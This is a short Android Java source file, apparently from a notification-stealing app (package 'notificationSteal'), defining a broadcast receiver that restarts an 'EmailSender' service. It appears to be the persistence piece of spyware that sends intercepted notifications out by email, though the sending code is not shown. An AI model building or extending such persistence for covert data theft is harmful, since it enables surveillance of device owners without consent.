package com.tomridder.notificationSteal;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

public class Restart extends BroadcastReceiver
{
    @Override
    public void onReceive(Context context, Intent intent) {
        Intent intent1=new Intent(context,EmailSender.class);
        context.startService(intent1);
    }
}
